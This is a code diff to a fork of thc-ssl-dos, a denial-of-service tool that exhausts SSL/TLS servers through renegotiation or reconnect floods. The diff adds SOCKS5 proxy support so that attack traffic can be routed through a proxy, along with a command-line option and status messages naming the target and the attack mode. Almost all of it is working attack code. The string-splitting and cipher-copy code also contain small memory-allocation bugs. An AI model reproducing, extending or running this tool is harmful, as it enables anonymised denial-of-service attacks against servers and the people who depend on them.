@@ -1,5 +1,21 @@
 #include "thc-ssl-dos.h"
 
+char **split(char *input, char *needle) {
+	char **splitted = (char **) malloc(sizeof(char *) * 2);
+
+	splitted[1] = strstr(input, needle);
+
+	if (splitted[1] == NULL)
+		return NULL;
+
+	splitted[1] = splitted[1] + strlen(needle);
+
+	splitted[0] = (char *) malloc(sizeof(char) * (strlen(input) - strlen(splitted[1]) - strlen(needle)));
+	strncpy(splitted[0], input, strlen(input) - strlen(splitted[1]) - strlen(needle));
+
+	return splitted;
+}
+
 static char *int_ntoa(uint32_t ip) {
 	struct in_addr x;
 
@@ -97,6 +113,161 @@ int tcp_connect(struct _peer *p) {
 	return ret;
 }
 
+int socks5_connect(struct _peer *p) {
+	int ret;
+	time_t start_socks5 = time(NULL);
+	char buf[16];
+	memset(&buf, 0x00, 16);
+
+	// Create TCP connection to SOCKS5 proxy server
+	p->sox = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (p->sox < 0)
+		return -1;
+
+	if (p->sox > g_opt.max_sox)
+		g_opt.max_sox = p->sox;
+
+	fcntl(p->sox, F_SETFL, fcntl(p->sox, F_GETFL, 0) | O_NONBLOCK);
+
+	memset(&p->addr, 0, sizeof p->addr);
+	p->addr.sin_family = AF_INET;
+	p->addr.sin_port = g_opt.proxy_port;
+	p->addr.sin_addr.s_addr = g_opt.proxy_ip;
+
+	// Connect to SOCKS5 proxy server
+	ret = connect(p->sox, (struct sockaddr *) &p->addr, sizeof p->addr);
+	if (ret < 0) {
+		//printf("[DEBUG] negative status while connecting to SOCKS5 proxy server: error code %d\n", errno);
+
+		// Ignore "Operation now in progress" error
+		if (errno != 115)
+			ERREXIT("Error while connecting to SOCKS5 proxy server (error code %d)\n", errno);
+	}
+	
+	/*
+	 * Send "Greeting from Client" (3 bytes): 
+	 * - SOCKS version: 0x05 (version 5)
+	 * - Methods of authentication supported: 0x01 (just one)
+	 * - Authentication method: 0x00 (no authentication)
+	*/
+	ret = send(p->sox, "\x05\x01\x00", 3, 0);
+	if (ret < 0)
+		ERREXIT("Error while sending \"Greeting from Client\" to SOCKS5 proxy server\n");
+
+	/*
+	 * Receive "Server's Choice" (2 bytes): 
+	 * - SOCKS version: 0x05 (version 5)
+	 * - Authentication method: 0x00 (no authentication)
+	*/
+	ret = recv(p->sox, buf, 2, MSG_WAITALL);
+	while (ret < 0) {
+		if (time(NULL) >= (start_socks5 + TO_SOCKS5_CONNECT))
+			ERREXIT("Error while receiving \"Server's Choice'\" from SOCKS5 proxy server: %d seconds timeout reached\n", TO_SOCKS5_CONNECT);
+		ret = recv(p->sox, buf, 2, MSG_WAITALL);
+	}
+
+	if (buf[0] != 0x05)
+		ERREXIT("Error: invalid \"Server's Choice\" received from SOCKS5 proxy server\n");
+
+	/*
+	 * Send "Client's Connection Request" (10 bytes): 
+	 * - SOCKS version: 0x05 (version 5)
+	 * - Command code: 0x01 (TCP connect) or 0x03 (UDP connect)
+	 * - Reserved: 0x00 (always 0)
+	 * - Address type: 0x01 (IP address)
+	 * - IP address: 4 bytes (one byte for every octet)
+	 * - Port number: 2 bytes (range from 0x0000 to 0xFFFF, in decimal from 0 to 65535)
+	*/
+	char conn_request[] = {
+		0x05,
+		(((g_opt.prot == DTLSv1) || (g_opt.prot == DTLSv1_2)) ? 0x03 : 0x01),
+		0x00,
+		0x01,
+		g_opt.ip & 0xFF,
+		(g_opt.ip >> 8) & 0xFF,
+		(g_opt.ip >> 16) & 0xFF,
+		(g_opt.ip >> 24) & 0xFF,
+		g_opt.port & 0xFF,
+		(g_opt.port >> 8) & 0xFF
+	};
+
+	ret = send(p->sox, conn_request, 10, 0);
+	if (ret < 0)
+		ERREXIT("Error while sending \"Client's Connection Request\" to SOCKS5 proxy server\n");
+	
+	/*
+	 * Receive "Server Response" (10 bytes): 
+	 * - SOCKS version: 0x05 (version 5)
+	 * - Status: from 0x00 (success) to 0x08 (errors)
+	 * - Reserved: 0x00 (always 0)
+	 * - Address type: 0x01 (IP address)
+	 * - IP address: 4 bytes (one byte for every octet)
+	 * - Port number: 2 bytes (range from 0x0000 to 0xFFFF, in decimal from 0 to 65535)
+	*/
+	memset(&buf, 0x00, 16);
+	
+	ret = recv(p->sox, buf, 10, MSG_WAITALL);
+	while (ret < 0) {
+		if (time(NULL) >= (start_socks5 + TO_SOCKS5_CONNECT))
+			ERREXIT("Error while receiving \"Server Response\" from SOCKS5 proxy server: %d seconds timeout reached\n", TO_SOCKS5_CONNECT);
+		ret = recv(p->sox, buf, 10, MSG_WAITALL);
+	}
+
+	if (buf[0] != 0x05)
+		ERREXIT("Error: invalid \"Server Response\" received from SOCKS5 proxy server\n");
+	
+	switch ((enum _socks5_status) buf[1]) {
+		case SUCCEEDED:
+		break;
+
+		case GENERAL_SOCKS_SERVER_FAILURE:
+			ERREXIT("SOCKS5 Error: General SOCKS server failure\n");
+		break;
+
+		case CONNECTION_NOT_ALLOWED_BY_RULESET:
+			ERREXIT("SOCKS5 Error: Connection not allowed by ruleset\n");
+		break;
+
+		case NETWORK_UNREACHABLE:
+			ERREXIT("SOCKS5 Error: Network unreachable\n");
+		break;
+
+		case HOST_UNREACHABLE:
+			ERREXIT("SOCKS5 Error: Host unreachable\n");
+		break;
+
+		case CONNECTION_REFUSED:
+			ERREXIT("SOCKS5 Error: Connection refused\n");
+		break;
+
+		case TTL_EXPIRED:
+			ERREXIT("SOCKS5 Error: TTL expired\n");
+		break;
+		
+		case COMMAND_NOT_SUPPORTED:
+			ERREXIT("SOCKS5 Error: Command not supported\n");
+		break;
+
+		case ADDRESS_TYPE_NOT_SUPPORTED:
+			ERREXIT("SOCKS5 Error: Address type not supported\n");
+		break;
+
+		default:
+			ERREXIT("Error: invalid \"Server Response\" status received from SOCKS5 proxy server (received status 0x%x)\n", buf[1]);
+	}
+
+	// Connection to SOCKS5 proxy server completed
+	//printf("Successfully connected to SOCKS5 proxy server on address %s port %d\n", int_ntoa(g_opt.proxy_ip), ntohs(g_opt.proxy_port));
+
+	struct timeval tv;
+	gettimeofday(&tv, NULL);
+	p->tv_connect_sec = tv.tv_sec;
+
+	ret = tcp_connect_try_finish(p, ret);
+
+	return ret;
+}
+
 static int ssl_connect_io(struct _peer *p) {
 	int ret;
 
@@ -187,7 +358,8 @@ static int ssl_dummywrite_io(struct _peer *p) {
 
 // Connect the peer via TCP
 static void PEER_connect(struct _peer *p) {
-	if (tcp_connect(p) != 0)
+	int ret = (g_opt.proxy_ip == -1) ? tcp_connect(p) : socks5_connect(p);
+	if (ret != 0)
 		ERREXIT("tcp_connect(): %s\n", strerror(errno));
 }
 
@@ -364,6 +536,8 @@ static void init_default(void) {
 	g_opt.n_max_peers = DEFAULT_PEERS;
 	g_opt.port = htons(443);
 	g_opt.ip = -1;
+	g_opt.proxy_ip = -1;
+	g_opt.proxy_port = -1;
 	g_opt.prot = -1;
 	g_opt.reneg_mode = 1;
 
@@ -427,11 +601,12 @@ static void init_vars(void) {
 static void usage(void) {
 	fprintf(stderr, ""
 		"./" PROGRAM_NAME " [OPTIONS] <IP> <PORT>\n"
-		"  -h,     --help           Help\n"
-		"  -r,     --reconnect      Reconnect attack mode [default: renegotiation attack mode]\n"
-		"  -l <N>, --limit <N>      Limit parallel connections [default: %d]\n"
-		"  -p <P>, --protocol <P>   Choose connection protocol [SSLv2/SSLv3/TLSv1/TLSv1_1/TLSv1_2/TLSv1_3/DTLSv1/DTLSv1_2]\n"
-		"  -c <C>, --cipher <C>     Choose cipher list string [default: all ciphers]\n"
+		"  -h,             --help                           Help\n"
+		"  -r,             --reconnect                      Reconnect attack mode [default: renegotiation attack mode]\n"
+		"  -l <N>,         --limit <N>                      Limit parallel connections [default: %d]\n"
+		"  -p <P>,         --protocol <P>                   Choose connection protocol [SSLv2/SSLv3/TLSv1/TLSv1_1/TLSv1_2/TLSv1_3/DTLSv1/DTLSv1_2]\n"
+		"  -c <C>,         --cipher <C>                     Choose cipher list string [default: all ciphers]\n"
+		"  -s <IP>:<PORT>, --socks-proxy <IP>:<PORT>        Specify SOCKS5 proxy [default: no proxy]\n"
 		"", DEFAULT_PEERS);
 	exit(0);
 }
@@ -440,6 +615,7 @@ static void do_getopt(int argc, char *argv[]) {
 	int i, c;
 
 	static int accept_flag = 0;
+	char **proxy_ip_port;
 
 	static struct option long_options[] = {
 		{"accept", no_argument, &accept_flag, 1},
@@ -448,12 +624,13 @@ static void do_getopt(int argc, char *argv[]) {
 		{"limit", required_argument, NULL, 'l'},
 		{"protocol", required_argument, NULL, 'p'},
 		{"cipher", required_argument, NULL, 'c'},
+		{"socks-proxy", required_argument, NULL, 's'},
 		{0, 0, 0, 0}
 	};
 
 	int option_index = 0;
 	
-	while ((c = getopt_long(argc, argv, "hl:p:c:r", long_options, &option_index)) != -1) {
+	while ((c = getopt_long(argc, argv, "hl:p:c:s:r", long_options, &option_index)) != -1) {
 		switch (c) {
 			case 0:
 			break;
@@ -491,6 +668,21 @@ static void do_getopt(int argc, char *argv[]) {
 				//free(g_opt.cipher);
 				g_opt.cipher = (char *) malloc(sizeof(char) * strlen(optarg));
 				strcpy(g_opt.cipher, optarg);
+			break;
+
+			case 's':
+				proxy_ip_port = split(optarg, ":");
+				if (proxy_ip_port == NULL)
+					ERREXIT("ERROR: Invalid proxy format\n");
+
+				g_opt.proxy_ip = inet_addr(proxy_ip_port[0]);
+				g_opt.proxy_port = htons(atoi(proxy_ip_port[1]));
+
+				if (g_opt.proxy_ip == -1)
+					ERREXIT("ERROR: Invalid proxy IP\n");
+
+				if (g_opt.proxy_port == -1)
+					ERREXIT("ERROR: Invalid proxy port\n");
 			break;
 
 			case 'h':
@@ -576,7 +768,8 @@ int main(int argc, char *argv[]) {
 		"\n"
 		"          Twitter @hackerschoice\n"
 		"\n"
-		"Greetingz: the french underground\n\n"
+		"Greetingz: the french underground\n"
+		"Forked by: cyberaz0r\n\n"
 	);
 	fflush(stdout);
 
@@ -584,7 +777,11 @@ int main(int argc, char *argv[]) {
 	do_getopt(argc, argv);
 	init_vars();
 
+	printf("Target: %s:%d\n", int_ntoa(g_opt.ip), ntohs(g_opt.port));
 	printf("Attack mode: %s attack\n", g_opt.reneg_mode ? "renegotiation" : "reconnect");
+	
+	if (g_opt.proxy_ip != -1)
+		printf("Using SOCKS5 proxy on %s:%d\n", int_ntoa(g_opt.proxy_ip), ntohs(g_opt.proxy_port));
 
 	g_opt.n_peers = 1;
 	for (i = 0; i < g_opt.n_peers; i++) {
